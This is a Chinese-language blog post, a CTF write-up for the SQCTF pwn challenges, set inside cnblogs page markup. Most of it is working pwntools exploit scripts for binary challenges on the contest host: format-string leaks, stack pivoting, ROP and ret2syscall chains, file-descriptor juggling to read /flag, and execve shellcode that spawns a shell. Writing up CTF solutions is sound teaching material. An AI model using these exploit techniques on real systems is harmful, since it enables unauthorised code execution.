@@ -1,0 +1,684 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />            
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="referrer" content="origin-when-cross-origin" />
+    <title>SQCTF pwn方向部分wp - imiab - 博客园</title>
+    
+    <meta name="description" content="你好哇，除了一个混杂了misc的pwn没写，其他的思路和writeup都写在这里了 题目总体还是偏基础的，如果不懂可以exp&#x2B;gdb调调看。 浅红欺醉粉，肯信有江梅 天哪好花哨的名字 输入nc balabala就有shell啦，然后愉快地ls cat flag便可 cat 主函数里有一个危险的get" />    
+    <meta property="og:description" content="你好哇，除了一个混杂了misc的pwn没写，其他的思路和writeup都写在这里了 题目总体还是偏基础的，如果不懂可以exp&#x2B;gdb调调看。 浅红欺醉粉，肯信有江梅 天哪好花哨的名字 输入nc balabala就有shell啦，然后愉快地ls cat flag便可 cat 主函数里有一个危险的get" />
+    <meta property="og:image" content="https://img2024.cnblogs.com/blog/3562901/202504/3562901-20250415212323880-1800137364.png" />
+    <meta property="bytedance:published_time" content="2025-04-15T21:29:50+08:00" />
+    
+    <link rel="stylesheet" href="/css/blog-common.min.css?v=6O_Ku8w_jYd3yw2BX9ElmxGv25AYbAQ-F6ZeOeZfxYc" />
+    
+    <link id="highlighter-theme-cnblogs" type="text/css" rel="stylesheet" href="/css/hljs/cnblogs.css?v=5J1NDtbnnIr2Rc2SdhEMlMxD4l9Eydj88B31E7_NhS4" />
+    <link type="text/css" rel="stylesheet" href="https://www.cnblogs.com/undefined/custom.css?v=M8To7qEiClk5j8&#x2B;gr6sf&#x2B;xNi&#x2B;ok=" />
+    
+    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="/css/mobile-common.min.css?v=a5tjm35tHR3Bq88JZf8V-jiXDhgs5wg823qWgRI6uRY" />
+    
+    <link id="favicon" rel="icon" type="image/x-icon" sizes="32x32" href="https://assets.cnblogs.com/favicon_v3_3.ico" />
+    <link id="favicon_svg" rel="icon" type="image/svg+xml" href="https://assets.cnblogs.com/favicon_v3_3.svg" />
+    <link rel="apple-touch-icon" href="https://assets.cnblogs.com/apple-touch-icon.png?v=2" />
+    <link rel="canonical" href="https://www.cnblogs.com/undefined/p/18827574" />
+    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/undefined/rss" />
+    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/undefined/rsd.xml" />
+    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/undefined/wlwmanifest.xml" />
+    
+    <script type="application/ld&#x2B;json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BlogPosting",
+      "@id": "https://www.cnblogs.com/undefined/p/18827574",
+      "headline": "SQCTF pwn方向部分wp",
+      "description": "你好哇，除了一个混杂了misc的pwn没写，其他的思路和writeup都写在这里了 题目总体还是偏基础的，如果不懂可以exp&#x2B;gdb调调看。 浅红欺醉粉，肯信有江梅 天哪好花哨的名字 输入nc balabala就有shell啦，然后愉快地ls cat flag便可 cat 主函数里有一个危险的get",
+      "image": [
+        
+      ],
+      "author": {
+        "@type": "Person",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "imiab",
+        "url": "https://www.cnblogs.com/undefined/"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.cnblogs.com/",
+        "name": "博客园",
+        "url": "https://www.cnblogs.com/"
+      },
+      "datePublished": "2025-04-15T21:30:00.0000000&#x2B;08:00",
+      "dateModified": "2025-04-15T21:30:00.0000000&#x2B;08:00",
+      "wordCount": "6801",
+      "isPartOf": {
+        "@type": "Blog",
+        "@id": "https://www.cnblogs.com/undefined/",
+        "name": "undefined",
+        "publisher": {
+          "@type": "Organization",
+          "@id": "https://www.cnblogs.com/",
+          "name": "博客园"
+        }
+      }
+    }
+    </script>
+
+    <script>
+        var currentBlogId = 841504;
+        var currentBlogApp = 'undefined';
+        var isLogined = false;
+        var isBlogOwner = false;
+        window.isCorp = false;
+        window.skinName = 'Custom';
+        var visitorUserId = '';
+        window.hasCustomScript = true;
+        window.cb_enable_mathjax = false;
+        window.mathEngine = 1;
+        window.codeHighlightEngine = 1;
+        window.enableCodeLineNumber = false;
+        window.codeHighlightTheme = 'cnblogs';
+        window.darkModeCodeHighlightTheme = 'vs2015';
+        window.isDarkCodeHighlightTheme = false;
+        window.isDarkModeCodeHighlightThemeDark = true;
+        window.isDisableCodeHighlighter = false;
+        window.enableCodeThemeTypeFollowSystem = false;
+        window.enableMacStyleCodeBlock = false;        
+    </script>
+        <script>
+            window.currentPostId = 18827574;
+            window.currentPostDateAdded = '2025-04-15 21:30';
+        </script>
+    <script src="https://assets.cnblogs.com/scripts/jquery-3.3.1.min.js"></script>
+    <script src="https://cdn-www.cnblogs.com/js/blog-common.min.js?v=q6A5rdB3tiIeY5Vi562gBAr3OVg5t0HcQVXePY_F0qU"></script>
+        <script>updateCustomBlogReferrer();</script>
+    
+</head>
+<body class="skin-custom has-navbar">
+    <a name="top"></a>
+    <div id="top_nav" class="navbar forpc">
+        <nav id="nav_main" class="navbar-main">
+            <ul id="nav_left" class="navbar-list navbar-left">
+                <li class="navbar-branding">
+                    <a href="https://www.cnblogs.com/" title="开发者的网上家园" role="banner">
+                        <img src="//assets.cnblogs.com/logo.svg" alt="博客园logo" />
+                    </a>
+                </li>
+                <li><a href="https://cnblogs.vip/">会员</a></li>
+                <li><a href="https://cnblogs.vip/store">周边</a></li>
+                <li><a href="https://news.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-news')">新闻</a></li>
+                <li><a href="https://q.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-q')">博问</a></li>
+                <li><a href="https://ing.cnblogs.com/" onclick="countClicks('nav', 'skin-navbar-ing')">闪存</a></li>                
+                <li><a href="https://www.cnblogs.com/cmt/p/19316348">赞助商</a></li>
+                <li><a href="https://chat2db-ai.com/" target="_blank">Chat2DB</a></li>
+            </ul>
+            <ul id="nav_right" class="navbar-list navbar-right">
+                <li>
+                    <form id="zzk_search" class="navbar-search dropdown" action="https://zzk.cnblogs.com/s" method="get" role="search">
+                        <input name="w" id="zzk_search_input" placeholder="代码改变世界" type="search" tabindex="3" autocomplete="off" />
+                        <button id="zzk_search_button" onclick="window.navbarSearchManager.triggerActiveOption()">
+                            <img id="search_icon" class="focus-hidden" src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                            <img class="hidden focus-visible" src="//assets.cnblogs.com/icons/enter.svg" alt="搜索" />
+                        </button>
+                        <ul id="navbar_search_options" class="dropdown-menu quick-search-menu">
+                            <li tabindex="0" class="active" onclick="zzkSearch(event, document.getElementById('zzk_search_input').value)">
+                                <div class="keyword-wrapper">
+                                    <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                    <div class="keyword"></div>
+                                </div>
+                                <span class="search-area">所有博客</span>
+                            </li>
+                                    <li tabindex="1" onclick="zzkBlogSearch(event, 'undefined', document.getElementById('zzk_search_input').value)">
+                                        <div class="keyword-wrapper">
+                                            <img src="//assets.cnblogs.com/icons/search.svg" alt="搜索" />
+                                            <div class="keyword"></div>
+                                        </div>
+                                        <span class="search-area">当前博客</span>
+                                    </li>
+                        </ul>
+                    </form>
+                </li>
+                <li id="navbar_login_status" class="navbar-list">
+                    <a class="navbar-user-info navbar-blog" href="https://i.cnblogs.com/EditPosts.aspx?opt=1" alt="写随笔" title="写随笔">
+                        <img id="new_post_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/newpost.svg" alt="写随笔" />
+                    </a>
+                    <a id="navblog-myblog-icon" class="navbar-user-info navbar-blog" href="https://www.cnblogs.com/my" alt="我的博客" title="我的博客">
+                        <img id="myblog_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/myblog.svg" alt="我的博客" />
+                    </a>
+                    <a class="navbar-user-info navbar-message navbar-icon-wrapper" href="https://msg.cnblogs.com/" alt="短消息" title="短消息">
+                        <img id="msg_icon" class="navbar-icon" src="//assets.cnblogs.com/icons/message.svg" alt="短消息" />
+                        <span id="msg_count" style="display: none"></span>
+                    </a>
+                    <a id="navbar_lite_mode_indicator" data-current-page="blog" style="display: none" href="javascript:void(0)" alt="简洁模式" title="简洁模式启用，您在访问他人博客时会使用简洁款皮肤展示">
+                        <img class="navbar-icon" src="//assets.cnblogs.com/icons/lite-mode-on.svg" alt="简洁模式" />
+                    </a>
+                    <div id="user_info" class="navbar-user-info dropdown">
+                        <a class="dropdown-button" href="https://home.cnblogs.com/">
+                            <img id="user_icon" class="navbar-avatar" src="//assets.cnblogs.com/icons/avatar-default.svg" alt="用户头像" />
+                        </a>
+                        <div class="dropdown-menu">
+                            <a id="navblog-myblog-text" href="https://www.cnblogs.com/my">我的博客</a>
+                            <a href="https://home.cnblogs.com/">我的园子</a>
+                            <a href="https://account.cnblogs.com/settings/account">账号设置</a>
+                            <a href="https://vip.cnblogs.com/my">会员中心</a>
+                            <a href="javascript:void(0)" id="navbar_lite_mode_toggle" title="简洁模式会使用简洁款皮肤显示所有博客">
+    简洁模式 <span id="navbar_lite_mode_spinner" class="hide">...</span>
+</a>
+
+                            <a href="javascript:void(0)" onclick="account.logout();">退出登录</a>
+                        </div>
+                    </div>
+                    <a class="navbar-anonymous" href="https://account.cnblogs.com/signup">注册</a>
+                    <a class="navbar-anonymous" href="javascript:void(0);" onclick="account.login()">登录</a>
+                </li>
+            </ul>
+        </nav>
+    </div>
+
+    <div id="page_begin_html">
+        <div id="loading"><div class="loader-inner"></div></div>
+    </div>
+
+    <div id="home">
+<div id="header">
+	<div id="blogTitle">
+        <a id="lnkBlogLogo" href="https://www.cnblogs.com/undefined/"><img id="blogLogo" src="/skins/custom/images/logo.gif" alt="返回主页" /></a>		
+		
+
+<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/undefined">undefined</a>
+</h1>
+<h2></h2>
+
+
+
+
+		
+	</div>
+	<div id="navigator">
+		
+<ul id="navList">
+<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
+博客园</a>
+</li>
+<li>
+<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/undefined/">
+首页</a>
+</li>
+<li>
+
+<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
+新随笔</a>
+</li>
+<li>
+<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/imiab">
+联系</a></li>
+<li>
+<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/undefined/rss/">
+订阅</a>
+<!--<partial name="./Shared/_XmlLink.cshtml" model="Model" /></li>--></li>
+<li>
+<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
+管理</a>
+</li>
+</ul>
+
+
+		<div class="blogStats">
+			<div id="blog_stats_place_holder"><script>loadBlogStats();</script></div>
+		</div>
+	</div>
+</div>
+<div id="main">
+	<div id="mainContent">
+	<div class="forFlow">
+		<div id="post_detail">
+    
+    <div id="topics">
+        <div class="post">
+            <h1 class = "postTitle">
+                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/undefined/p/18827574" title="发布于 2025-04-15 21:29">
+    
+
+    <span role="heading" aria-level="2">SQCTF pwn方向部分wp</span>
+    
+
+</a>
+
+            </h1>
+            <div class="clear"></div>
+            <div class="postBody">
+                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
+<p>你好哇，除了一个混杂了misc的pwn没写，其他的思路和writeup都写在这里了</p>
+<p>题目总体还是偏基础的，如果不懂可以exp+gdb调调看。</p>
+<h1 id="浅红欺醉粉肯信有江梅">浅红欺醉粉，肯信有江梅</h1>
+<p>天哪好花哨的名字</p>
+<p>输入nc balabala就有shell啦，然后愉快地ls cat flag便可</p>
+<h1 id="cat">cat</h1>
+<p>主函数里有一个危险的<code>gets</code></p>
+<p>只要我们输入一个很长的字符串，就进backdoor啦</p>
+<p>exp:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"</p>
+<h1 id="pwn03">pwn03</h1>
+<p><img src="https://img2024.cnblogs.com/blog/3562901/202504/3562901-20250415212323880-1800137364.png" alt="" loading="lazy"></p>
+<p>如图，通过栈上fmt泄露canary和pie</p>
+<p>然后构造栈迁移，填入binsh，注意binsh要填在栈的下方而非上方，否则会被覆盖</p>
+<p>exp:</p>
+<pre><code class="language-python">from pwn import *
+filename='./pwn03'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+p=remote('challenge.qsnctf.com',30988)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+# gdb.attach(p,'go')
+pay="%11$p%15$p"
+sl(pay)
+p.recvuntil('0x')
+canary=int(p.recvuntil("0x",drop=True),16)
+pie=int(p.recvline(keepends=False),16)-0x125b
+
+
+rdi=0x0000000000001245+pie
+saddr=e.plt['system']+pie
+bss=e.bss(0xF08)+pie
+
+pay2=b'x'*8+p64(canary)+p64(bss)+p64(0x11f1+pie)
+s(pay2)
+pause()
+pay3=b'x'*8+p64(canary)+p64(bss+8)+p64(0x11f1+pie)
+s(pay3)
+binsh=bss+0x10
+pay4=p64(rdi)+p64(binsh)+p64(saddr)+b'/bin/sh\x00'
+pause()
+s(pay4)
+p.interactive()
+
+</code></pre>
+<h1 id="gift">gift</h1>
+<p>简单的ret2backdoor题目</p>
+<p>第一次打发现没打通，猜测是system没有对对齐，跳过push rbp后成功打通</p>
+<pre><code class="language-python">from pwn import *
+filename='./gift'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+p=remote('challenge.qsnctf.com',31741)
+# p=process(filename)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+# context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+pay=b'x'*72+p64(0x4011bb)*8
+sl(pay)
+p.interactive()
+#p=remote()
+</code></pre>
+<h1 id="bad">bad</h1>
+<p>init_memory初始化bss段为rwx，直接shellcraft写sh在ret2bss即可</p>
+<p>注意用了memcpy，不可以填充\x00哦，这里我选择健康的\x90(nop)</p>
+<p><s>虽然填nop没什么意义就是了，执行到nop说明100%没打通</s><br>
+exp:</p>
+<pre><code class="language-python">from pwn import *
+filename='./bad'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+p=remote('challenge.qsnctf.com',31424)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+pay=asm(shellcraft.sh())
+pay=pay.ljust(72,b'\x90')+p64(0x4040A0)
+sl(pay)
+p.interactive()
+#p=remote()
+</code></pre>
+<h1 id="pwn01---当时只道是寻常">pwn01 - 当时只道是寻常</h1>
+<p>因为忘记了srop，展示无srop打法</p>
+<p>初始情况下，开满三个fd，分别是stdin，stdout,stderr</p>
+<pre><code>dup stdin   0 -&gt; 3  #防止close1后直接eof退出
+dup2 stdout 0 &lt;- 1  #给openat留出位置
+close         -- 1  #给openat留出位置
+openat        ++ 1  #openat使用rsi传参，当rsi为绝对路径时，rdi可以忽略
+
+                    #由于我们没有任意读，所以必须在栈上构造filename，也就是
+                     在rbp所在的地方写入filename
+
+read             1  #前面煞费苦心地迁移fd，就是为了在这里read用的
+                     为了可以读文件且程序不崩溃，我们必须保证以下几个条件
+
+                     rsi必须不在栈上，否则会覆盖我们的rop链子
+                     那么rdi必须为1，因为我们要控制rsi就无法控制rdi
+                     
+                     rdi为1那么stdout必须移动到别的地方，在本题中，
+                     我们无法控制除了0和1以外的任何fd，而我们最后必须
+                     write stdout输出，也就是此时0必须是stdout
+                     但是直接关了stdin会导致broken pipe程序立马崩溃
+                     所以必须用dup stdin来把文件描述符传出去
+                     由于智能指针的性质，此时stdin不会被系统回收，
+                     程序也不会崩溃，我们就能顺利readflag到指定位置
+                     并最后重新把它输出出来
+
+dup2 stdout 0 -&gt; 1
+write            1  #同之前分析相同，若要控制rdi=0就无法控制rsi，而
+                     我们的flag是写到bss上的，所以必须dup2 stdout到1
+                     最后成功输出flag
+</code></pre>
+<p>exp:</p>
+<pre><code class="language-python">from pwn import *
+filename='./pwn01'
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+p=remote('challenge.qsnctf.com',31683)
+e=ELF(filename)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+
+ret=0x0000000000401048
+rsi_rax=0x0000000000401049
+rax=0x000000000040104a
+binsh=0x000000000402039+1
+sys_rbp=0x401045
+pay=b'deadbeaf'
+pay+=p64(rax)+p64(0x20)+p64(0x401024)+p64(0)
+pay+=p64(rsi_rax)+p64(0)+p64(0x21)+p64(sys_rbp)+p64(0)
+pay+=p64(rax)+p64(3)+p64(sys_rbp)+p64(0)
+
+pay+=p64(rax)+p64(0x101)+p64(0x0401024)+b'/flag\x00\x00\x00'
+pay+=p64(rsi_rax)+p64(e.bss(0x400))+p64(0)+p64(0x40102C)+p64(0)
+pay+=p64(rax)+p64(3)+p64(sys_rbp)+p64(0)
+pay+=p64(rax)+p64(0x20)+p64(0x401024)+p64(0)
+pay+=p64(rax)+p64(1)+p64(sys_rbp)+p64(0)
+pay+=p64(rsi_rax)+p64(e.bss(0x400))+p64(1)+p64(0x401018)
+s(pay)
+
+p.interactive()
+
+#p=remote()
+</code></pre>
+<h1 id="pwn---被酒莫惊春睡重">pwn - 被酒莫惊春睡重</h1>
+<p>简单栈溢出+ret2syscall呀</p>
+<pre><code class="language-python">from pwn import *
+filename='./pwn'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+p=remote('challenge.qsnctf.com',30135)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+
+rdx_rsi_rdi_rax=0x00000000004011e0
+sret=0x00000000004011ec
+pay=b'x'*0x48+p64(rdx_rsi_rdi_rax)+p64(0x10)+p64(e.bss(0x220))+p64(0)+p64(0)+p64(sret)
+pay+=p64(rdx_rsi_rdi_rax)+p64(0)+p64(0)+p64(e.bss(0x220))+p64(0x3b)+p64(sret)
+sla('请输入你的名字: ',pay)
+sa('0x','/bin/sh\x00')
+p.interactive()
+#p=remote()
+</code></pre>
+<h1 id="pwn02---赌书消得泼茶香">pwn02 - 赌书消得泼茶香</h1>
+<p>简单栈溢出，记得后面多填一点东西，不然\x00写不满</p>
+<pre><code class="language-python">from pwn import *
+filename='./pwn02'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+p=remote('challenge.qsnctf.com',32710)
+# p=process(filename)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+back=0x401422
+
+pay=b'x'*0x68+p64(back)*2
+import base64
+
+sl(base64.b64encode(pay))
+
+p.interactive()
+</code></pre>
+<h1 id="pwn01---我觉君非池中物咫尺蛟龙云雨">pwn01 - 我觉君非池中物，咫尺蛟龙云雨</h1>
+<p>一个简单的写shellcode题，条件也很宽松呀</p>
+<pre><code class="language-python">from pwn import *
+filename='./pwn'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+p=remote('challenge.qsnctf.com',31424)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+pay=asm('''
+nop;
+mov rax,0x68732f6e69622f;
+push rax;
+mov rdi,rsp;
+xor edx,edx;
+xor esi,esi;
+mov eax,0x3b
+syscall
+        ''')
+sl(pay)
+p.interactive()
+#p=remote()
+</code></pre>
+<h1 id="key---借的东风破金锁">key - 借的东风破金锁</h1>
+<p>甚至不是栈溢出，ida看一眼key就做完了</p>
+<pre><code class="language-python">from pwn import *
+filename='./key'
+# libc=
+
+sla = lambda x,s : p.sendlineafter(x,s)
+sl = lambda s : p.sendline(s)
+sa = lambda x,s : p.sendafter(x,s)
+s = lambda s : p.send(s)
+
+# p=process(filename)
+p=remote('challenge.qsnctf.com',31746)
+e=ELF(filename)
+# libc=ELF(libc)
+context.log_level='debug'
+context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
+# gdb.attach(p)
+
+s('FTCUNQS\x00\x00')
+
+p.interactive()
+</code></pre>
+<h1 id="damn">damn</h1>
+<p>什么，misc没写出来所以不看了（躺</p>
+
+
+</div>
+<div class="clear"></div>
+<div id="blog_post_info_block" role="contentinfo" class="post-meta-container">
+    <div id="blog_post_info"></div>
+    <div class="clear"></div>
+    <div id="post_next_prev"></div>
+</div>
+            </div>
+            <div class="postDesc">posted @ 
+<span id="post-date" data-last-update-days="0" data-date-updated="2025-04-15 21:30">2025-04-15 21:29</span>&nbsp;
+<a href="https://www.cnblogs.com/undefined">imiab</a>&nbsp;
+阅读(<span id="post_view_count">145</span>)&nbsp;
+评论(<span id="post_comment_count">0</span>)&nbsp;
+&nbsp;
+<a href="javascript:void(0)" onclick="AddToWz(18827574);return false;">收藏</a>&nbsp;
+<a href="https://report.cnblogs.com?targetLink=https%3A%2F%2Fwww.cnblogs.com%2Fundefined%2Fp%2F18827574&targetId=18827574&targetType=0" target="_blank">举报</a>
+</div>
+        </div>
+	    
+	    
+    </div><!--end: topics 文章、评论容器-->
+</div>
+<script>
+    var cb_entryId = 18827574, cb_entryCreatedDate = '2025-04-15 21:29', cb_postType = 1, cb_postTitle = 'SQCTF pwn方向部分wp';
+    var allowComments = true, cb_blogId = 841504, cb_blogApp = 'undefined', cb_blogUserGuid = '8a0895b2-d2a5-4d98-c91d-08dd08913576';
+    mermaidRender.render()
+    markdown_highlight()
+    zoomManager.apply("#cnblogs_post_body img:not(.code_img_closed):not(.code_img_opened)");    
+</script>
+<a id="!comments"></a>
+<div id="blog-comments-placeholder"></div>
+<div id="comment_form" class="commentform">
+    <a name="commentform"></a>
+    <div id="divCommentShow"></div>
+    <div id="comment_nav">
+        <div class="comment-nav-right">
+            <span id="span_refresh_tips"></span><a href="#" onclick="return RefreshPage();">刷新页面</a><a href="#top">返回顶部</a>
+        </div>
+    </div>
+    <div id="comment_form_container"></div>
+    <div class="ad_text_commentbox" id="ad_text_under_commentbox"></div>
+        <div id="cnblogs_ch"></div>
+    <div id="opt_under_post"></div>
+        <div id="blog_c1" class="under-post-card below-post-card">
+            <a href="https://www.doubao.com/download/desktop?ug_apk_token=FxCjd" rel="nofollow" target="_blank" onclick="countCreativeClicks('C1-字节-豆包')">
+                <img src="https://img2024.cnblogs.com/blog/35695/202609/35695-20260905201441417-1701437871.webp" onload="countCreativeImpressions('C1-字节-豆包')" alt="" style="width:300px!important;height:250px!important;min-width:300px!important;max-width:300px!important;" />
+                <span id="c1_impression" style="display:none"></span>
+            </a>
+        </div>
+    <div id="under_post_card1"></div>
+    <div id="related_posts_card"></div>
+    <div id="under_post_card2"></div>
+    <div id="HistoryToday" class="under-post-card below-post-card"></div>
+    <script type="text/javascript">
+        var commentManager = new blogCommentManager();
+        commentManager.renderComments(0);
+        fixPostBody();
+        window.footnoteTipManager.generateFootnoteTips();
+
+            window.tocManager.displayDisableTocTips = false;
+            window.tocManager.generateToc();
+            
+            setTimeout(function() { countViews(cb_blogId, cb_entryId); }, 50);
+            
+            deliverT2();
+            deliverC1C2();
+            loadNewsAndKb();
+            
+            LoadPostCategoriesTags(cb_blogId, cb_entryId);
+            
+            LoadPostInfoBlock(cb_blogId, cb_entryId, cb_blogApp, cb_blogUserGuid);
+            GetPrevNextPost(cb_entryId, cb_blogId, cb_entryCreatedDate, cb_postType);
+            loadOptUnderPost();
+            GetHistoryToday(cb_blogId, cb_blogApp, cb_entryCreatedDate);
+                </script>
+</div>
+
+	</div>
+	</div>
+	<div id="sideBar">
+		<div id="sideBarMain">
+			
+			<div id="blog-calendar" style="display:none"></div><script>loadBlogDefaultCalendar();</script>			
+			<div id="leftcontentcontainer">
+				<div id="blog-sidecolumn"></div>
+					<script>loadBlogSideColumn()</script>
+			</div>			
+		</div>
+	</div>
+	<div class="clear"></div>
+	</div>
+	<div class="clear"></div>
+	<div id="footer">
+		<a href="https://www.cnblogs.com/" id="footer_site_link" class="footer-brand">博客园</a>
+<span class="footer-copyright"> &nbsp;&copy;&nbsp; 2004-2026</span>
+<br /><span class="footer-icp">
+    <a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771"><img src="//assets.cnblogs.com/images/ghs.png" />浙公网安备 33010602011771号</a>
+    <a href="https://beian.miit.gov.cn" target="_blank">浙ICP备2021040463号-3</a>
+</span>
+
+
+
+	</div>
+</div>
+
+
+
+    <div id="page_end_html">
+        <script src="https://cdn.cnblogs.com/awescnb/index.js"></script>
+<script>
+  const opts = {
+    bodyBackground: {
+        enable: true,
+        value:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312133253_meiying.jpg',
+        opacity: 0.85,
+        repeat: true,
+    },
+    theme: {
+      name: 'geek',
+      avatar:'https://images.cnblogs.com/cnblogs_com/blogs/841504/galleries/2448994/o_250312125116_QQ%E5%9B%BE%E7%89%8720240807015716.jpg',
+    },
+    darkMode: {
+        enable: true,
+        darkDefault: false,
+    },
+  signature: {
+      enable: false,
+      contents: [
+      "",
+      ],
+    },
+  }
+  $.awesCnb(opts)
+</script>
+    </div>
+
+    <input type="hidden" id="antiforgery_token" value="CfDJ8Ow5-In01nBEvFwaadRGjqEUIkrnESZpTIxa80OZFGiHdD1K2REjxxcSzgwJWqF4rC27-D-yBpjxO9b2mWfyKYTf8vK3jbWq-JwP9gEIhg7JrtqSrPaQejOPRozJsbB-zjZjOq6Sm0KtRCPXqPz9lnU" />
+    <script defer src="https://hm.baidu.com/hm.js?866c9be12d4a814454792b1fd0fed295"></script>
+<script defer src="https://lf1-cdn-tos.bytegoofy.com/goofy/ttzz/push.js?32d945448dd797af605da9156763de3dc11c9886368d0f917d6388e4fcf5542030632485602430134f60bc55ca391050b680e2741bf7233a8f1da9902314a3fa" id="ttzz"></script>
+</body>
+</html>
